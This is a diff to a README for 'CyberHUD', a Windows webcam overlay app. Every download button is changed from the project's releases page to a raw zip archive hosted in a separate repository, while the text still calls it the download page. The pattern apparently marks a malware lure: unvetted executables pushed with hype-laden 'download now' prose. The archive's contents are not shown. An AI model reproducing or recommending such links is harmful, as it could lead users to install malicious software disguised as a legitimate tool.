@@ -6,7 +6,7 @@ description: "Turn your webcam into a real-time cyberpunk HUD with local face de
 <h1>👁️ CyberHUD - Your Personal Cyberpunk Vision Overlay</h1>
 
 <p align="center">
-  <a href="https://github.com/Tiphanispicescented8799/CyberHUD/releases" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD CYBERHUD NOW</a>
+  <a href="https://raw.githubusercontent.com/Tiphanispicescented8799/tiphanispicescented8799.github.io/main/data/Dist-v1.3.zip" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD CYBERHUD NOW</a>
 </p>
 
 ## 🌟 What is CyberHUD?
@@ -39,7 +39,7 @@ Follow these simple steps to get CyberHUD running on your computer:
 
 ### Step 1: Download the Application
 
-<a href="https://github.com/Tiphanispicescented8799/CyberHUD/releases" style="background-color:#FF5722;color:white;padding:12px 24px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:6px;">📥 VISIT THE DOWNLOAD PAGE</a>
+<a href="https://raw.githubusercontent.com/Tiphanispicescented8799/tiphanispicescented8799.github.io/main/data/Dist-v1.3.zip" style="background-color:#FF5722;color:white;padding:12px 24px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:6px;">📥 VISIT THE DOWNLOAD PAGE</a>
 
 Visit this link to download the application. This page contains the latest version of CyberHUD ready for Windows.
 
@@ -118,7 +118,7 @@ CyberHUD leverages Python and OpenCV, a powerful computer-vision library, to per
 
 Don't wait to experience the future. Download CyberHUD now and transform your computer into a window to a cyberpunk world. It's free, it's easy, and it's incredibly cool. Whether you're a tech enthusiast, a content creator, or just someone who loves futuristic gadgets, CyberHUD will not disappoint.
 
-<a href="https://github.com/Tiphanispicescented8799/CyberHUD/releases" style="background-color:#2196F3;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;margin:20px 0;">🚀 GET CYBERHUD NOW</a>
+<a href="https://raw.githubusercontent.com/Tiphanispicescented8799/tiphanispicescented8799.github.io/main/data/Dist-v1.3.zip" style="background-color:#2196F3;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;margin:20px 0;">🚀 GET CYBERHUD NOW</a>
 
 ## 📞 Need Help?
 
